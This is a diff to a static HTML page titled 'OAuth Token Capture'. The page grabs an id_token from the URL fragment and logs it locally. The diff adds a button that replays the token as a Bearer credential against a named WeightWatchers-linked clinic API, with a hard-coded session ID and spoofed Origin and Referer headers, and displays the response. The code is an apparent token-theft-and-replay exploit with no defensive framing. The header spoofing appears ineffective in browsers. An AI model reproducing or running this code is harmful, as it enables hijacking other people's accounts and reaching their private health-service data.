@@ -6,8 +6,9 @@
 <body>
   <h1>OAuth Token Capture (Static GitHub Page)</h1>
   <p id="status">Waiting for token...</p>
-
   <textarea id="log" rows="20" cols="100" readonly></textarea>
+  <button onclick="makeAuthorizedRequest()">🔍 Send Authenticated Request</button>
+  <iframe id="responseFrame" style="width:100%; height:300px; border:1px solid #ccc; margin-top:1em;"></iframe>
 
   <script>
     const hash = window.location.hash.substring(1);
@@ -21,7 +22,6 @@
       const time = new Date().toISOString();
       const entry = `--- ${time} ---\nToken: ${id_token}\nURL: ${window.location.href}\n\n`;
 
-      // Save in browser localStorage (not shared)
       const existing = localStorage.getItem("token_logs") || "";
       const updated = existing + entry;
       localStorage.setItem("token_logs", updated);
@@ -31,6 +31,28 @@
     } else {
       status.textContent = "⚠️ No id_token found in URL fragment.";
       logBox.value = localStorage.getItem("token_logs") || "";
+    }
+
+    function makeAuthorizedRequest() {
+      if (!id_token) return alert("No token found to send");
+
+      fetch("https://ww-integration-api.joinsequence.com/api/v1/ww/clinic-tab-init?locale=en-US&path=%2F", {
+        method: "GET",
+        headers: {
+          "Authorization": `Bearer ${id_token}`,
+          "Accept": "application/json, text/plain, */*",
+          "Ww-Ssid": "en-US-1466641065.1750185",
+          "Ww-Client": "rsw",
+          "Origin": "https://www.weightwatchers.com",
+          "Referer": "https://www.weightwatchers.com/"
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        const frame = document.getElementById("responseFrame");
+        frame.srcdoc = `<pre>${data.replace(/</g, '&lt;')}</pre>`;
+      })
+      .catch(err => alert("Error making request: " + err));
     }
   </script>
 </body>
